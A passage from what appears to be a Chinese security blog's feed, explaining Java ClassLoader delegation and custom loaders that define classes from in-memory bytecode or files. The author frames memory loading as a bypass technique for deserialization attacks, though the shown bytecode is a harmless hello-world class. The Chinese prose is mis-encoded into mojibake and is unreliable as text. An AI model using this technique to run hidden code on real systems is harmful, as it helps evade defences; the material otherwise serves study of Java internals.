JAVA_HOME/lib/ext/*.jar ä¸­ï¼Œåº“åé€šå¸¸ä»¥ javax å¼€å¤´ã€‚</p></li><li><p>AppClassLoaderï¼Œåº”ç”¨ç±»åŠ è½½å™¨/ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œç›´æ¥æä¾›ç»™ç”¨æˆ·ä½¿ç”¨çš„ClassLoaderï¼Œå®ƒä¼šåŠ è½½ ClASSPATH ç¯å¢ƒå˜é‡æˆ–è€… java.class.path å±æ€§é‡Œå®šä¹‰çš„è·¯å¾„ä¸­çš„ jar åŒ…å’Œç›®å½•ï¼Œè´Ÿè´£åŠ è½½åŒ…æ‹¬å¼€å‘è€…ä»£ç ä¸­ã€ç¬¬ä¸‰æ–¹åº“ä¸­çš„ç±»ã€‚</p></li></ul><p>å®¹æ˜“è¯¯ä¼šçš„ä¸€ç‚¹æ˜¯Classloaderä¹‹é—´å¹¶ä¸æ˜¯ç»§æ‰¿å…³ç³»è€Œæ˜¯ç»„åˆã€‚<br><img src="1579509377078-045bf8a3-1a58-4f33-9d95-e3ef2d06c03a.png#align=left&display=inline&height=308&name=image.png&originHeight=616&originWidth=1518&size=119384&status=done&style=none&width=759" alt="image.png"></p><p>AppClassLoaderå’ŒExtClassLoaderéƒ½ç»§æ‰¿è‡ªURLClasLoaderã€‚<br><img src="1579508579303-9a8d00d7-3a6e-435c-8fb4-c1e822b209ff.png#align=left&display=inline&height=233&name=image.png&originHeight=466&originWidth=1892&size=121667&status=done&style=none&width=946" alt="image.png"></p><p>URLClassLoaderç»§æ‰¿è‡ªClassLoaderã€‚<br><img src="1579508772615-6b36f925-920f-4dda-8fe9-a06f0d192f4a.png#align=left&display=inline&height=408&name=image.png&originHeight=550&originWidth=1006&size=34288&status=done&style=none&width=746" alt="image.png"></p><p>è€Œä¸€èˆ¬è‡ªå®šä¹‰åŠ è½½å™¨æ˜¯ç›´æ¥ç»§æ‰¿ClassLoaderå¹¶æ ¹æ®éœ€æ±‚é‡å†™findClassæˆ–è€…loadClassæ–¹æ³•ï¼ˆä¹‹åä¼šæåˆ°ï¼‰ã€‚<br><img src="1579508811045-b00cfcaf-142a-4b08-8dd2-5d8464940f41.png#align=left&display=inline&height=133&name=image.png&originHeight=266&originWidth=1590&size=46469&status=done&style=none&width=795" alt="image.png"></p><p>åœ¨javaä»£ç æˆ‘ä»¬å¯ä»¥è°ƒç”¨getParentçš„æ–¹æ³•è·å–è¯¥åŠ è½½å™¨çš„çˆ¶åŠ è½½å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassLoader appClassloader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        ClassLoader extensionClassloader = appClassloader.getParent();</span><br><span class="line">        System.out.println(<span class="string">"AppClassLoader is "</span> + appClassloader);</span><br><span class="line">        System.out.println(<span class="string">"The parent of AppClassLoader is "</span> + extensionClassloader);</span><br><span class="line">        System.out.println(<span class="string">"The parent of ExtensionClassLoader is "</span> + extensionClassloader.getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console ouput:</span></span><br><span class="line"><span class="comment">////AppClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br><span class="line"><span class="comment">////The parent of AppClassLoader is sun.misc.Launcher$ExtClassLoader@61bbe9ba</span></span><br><span class="line"><span class="comment">////The parent of ExtensionClassLoader is null</span></span><br></pre></td></tr></table></figure><p><em>ps: å› ä¸ºBootstrapClassLoaderæ˜¯å†…åµŒåˆ°jvmä¸­cä»£ç ï¼Œå¼€å‘è€…æ— æ³•ç›´æ¥è·å–ï¼Œå› æ­¤ExtensionClassLoader.getParent()ä¼šè¿”å›nullã€‚</em><br>_<br>demoä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException </span>&#123;</span><br><span class="line">        Test test  = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨new çš„ä½ç½®å¼ºåˆ¶è¿›å…¥ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»ç¡®å®æ˜¯ä»å­åŠ è½½å™¨AppClassLoaderå¼€å§‹çš„ã€‚<br><img src="1579509643539-5239956c-aae6-4711-9528-d408fdb9fcc5.png#align=left&display=inline&height=287&name=image.png&originHeight=574&originWidth=2848&size=159070&status=done&style=none&width=1424" alt="image.png"></p><p>æ­¥å…¥ä¸¤æ­¥ååœ¨ç¬¬ä¸€ä¸ªçº¢æ¡†å¯ä»¥çœ‹åˆ°åŠ è½½åŒäº²å§”æ´¾çš„é€»è¾‘ã€‚<br><img src="1579510144691-d9aa11c7-f072-467e-bf3a-9ae5c9dfd21a.png#align=left&display=inline&height=734&name=image.png&originHeight=1468&originWidth=2200&size=358925&status=done&style=none&width=1100" alt="image.png"></p><p>å¦‚æœçˆ¶ç±»æ— æ³•åŠ è½½ï¼Œé‚£ä¹ˆä½¿ç”¨è‡ªå·±çš„findClasså®ç°æ¥æ‰¾ã€‚è¿™é‡ŒTestæ˜¯æˆ‘è‡ªå®šä¹‰çš„å› æ­¤ä¸åœ¨<code>JAVA_HOME/lib/rt.jar</code><br>ä¹Ÿä¸åœ¨ <code>JAVA_HOME/lib/ext/*.jar</code>ä¸­ï¼Œæ‰€ä»¥æœ€åä¼šä½¿ç”¨AppClassLoaderçš„findClasså®ç°ï¼Œè€ŒAppClassLoaderæ²¡æœ‰å®ç°è‡ªå·±çš„findClassï¼Œæ‰€ä»¥æœ€åæ˜¯ç”±URLClassLoader findClasså¯»æ‰¾ç±»ã€‚æœ€åé€šè¿‡deineClassæŠŠå­—èŠ‚ç è½¬æ¢ä¸ºç±»å¯¹è±¡ã€‚<br><img src="1579659421047-d0c30290-aee4-4347-b9e0-66df1d527dca.png#align=left&display=inline&height=501&name=image.png&originHeight=1002&originWidth=2446&size=306425&status=done&style=none&width=1223" alt="image.png"></p><h2 id="é‡å†™ClassLoader"><a href="#é‡å†™ClassLoader" class="headerlink" title="é‡å†™ClassLoader"></a>é‡å†™ClassLoader</h2><p>é€šè¿‡ä¸Šé¢åˆ†ææˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ç¬¬ä¸€æ¬¡åŠ è½½ç±»æ—¶æ˜¯åœ¨loadClassè¿›è¡Œloaderè°ƒåº¦ï¼ˆå®ç°åŒäº²å§”æ´¾é€»è¾‘ï¼‰ï¼Œæœ€åç”±findClassæ‹¿åˆ°è·¯å¾„Resourceï¼Œç”±defineClassåŠ è½½ç±»ã€‚<strong>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬æŠŠè‡ªå·±çš„classæ”¾åœ¨ä¸å¸¸è§„çš„ä½ç½®ï¼Œå°±éœ€è¦è‡ªå®šä¹‰ClassLoaderï¼Œé‡å†™findClassæ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬æƒ³çªç ´åŒäº²å§”æ´¾æ¨¡å‹ï¼ˆè¦†ç›–ç³»ç»Ÿç±»ï¼‰å°±éœ€è¦é‡å†™loadClassã€‚</strong></p><p>è€Œå®é™…åº”ç”¨ä¸­å¤„äºbypassçš„éœ€è¦æˆ‘ä»¬ç»å¸¸ä½¿ç”¨defineClassä¸€ä¸ªå¤šæ€å®ç°æ¥ä»å†…å­˜ä¸­æˆ–è€…æ–‡ä»¶ä¸­æ‰§è¡Œå‘½ä»¤ã€‚çœ‹ä¸‹é¢ä»£ç ã€‚</p><p>ä»å†…å­˜ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorldç±»å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">"com.anbai.sec.classloader.TestHelloWorld"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorldç±»å­—èŠ‚ç </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// åªå¤„ç†TestHelloWorldç±»</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨JVMçš„nativeæ–¹æ³•å®šä¹‰TestHelloWorldç±»</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºè‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</span></span><br><span class="line">        TestClassLoader loader = <span class="keyword">new</span> TestClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨åŠ è½½TestHelloWorldç±»</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åå°„åˆ›å»ºTestHelloWorldç±»ï¼Œç­‰ä»·äº TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">            Object testInstance = testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åå°„è·å–helloæ–¹æ³•</span></span><br><span class="line">            Method method = testInstance.getClass().getMethod(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åå°„è°ƒç”¨helloæ–¹æ³•,ç­‰ä»·äº String str = t.hello();</span></span><br><span class="line">            String str = (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»æ–‡ä»¶ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String classpath;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(String classpath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.classpath = classpath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] classDate = getClassBinaryData(name);</span><br><span class="line">            <span class="comment">//System.out.println(Arrays.toString(classDate));</span></span><br><span class="line">            <span class="keyword">if</span> (classDate == <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123; <span class="comment">// defineClassæ–¹æ³•å°†å­—èŠ‚ç è½¬åŒ–ä¸ºç±»</span></span><br><span class="line">                <span class="keyword">return</span> defineClass(name, classDate, <span class="number">0</span>, classDate.length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125; <span class="comment">// è¿”å›ç±»çš„å­—èŠ‚ç </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getClassBinaryData(String className) <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        InputStream in = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">null</span>;</span><br><span class="line">        String path = classpath + File.separatorChar + className.replace(<span class="string">'.'</span>, File.separatorChar) + <span class="string">".class"</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            in = <span class="keyword">new</span> FileInputStream(path);</span><br><span class="line">            out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span></span><br><span class="line">        &#123;</span><br><span class="line">            in.close();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">JavaåŠ¨æ€ç±»åŠ è½½ï¼Œå½“FastJsoné‡åˆ°å†…ç½‘</a><br><a href="https://benjaminwhx.com/2018/08/26/Idea%E4%B8%AD%E9%82%A3%E4%BA%9B%E9%B2%9C%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/">Ideaä¸­é‚£äº›é²œä¸ºäººçŸ¥çš„è°ƒè¯•æŠ€å·§</a><br><a href="https://cloud.tencent.com/developer/article/1149445">Javaè™šæ‹Ÿæœºâ€“ç±»åŠ è½½å™¨æºç </a></p>]]></content>
    
    <summary type="html">
    
      åœ¨ååºåˆ—åŒ–çš„å­¦ä¹ è¿‡ç¨‹ä¸­æ€»æ˜¯ä¸å¯å›é¿ç¢°åˆ°è¿™ä¸ªç‚¹ï¼Œè¿™æ¬¡å°±æ¥ç®€å•çœ‹çœ‹ã€‚
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java Runtime.getRuntime().execç”±è¡¨åŠé‡Œ</title>
    <link href="https://cl0und.github.io/2020/01/11/Java-Runtime-getRuntime-exec%E7%94%B1%E8%A1%A8%E5%8F%8A%E9%87%8C/"/>
    <id>https://cl0und.github.io/2020/01/11/Java-Runtime-getRuntime-exec%E7%94%B1%E8%A1%A8%E5%8F%8A%E9%87%8C/</id>
    <published>2020-01-11T14:32:03.000Z</published>
    <updated>2020-07-11T08:03:14.434Z</updated>
    
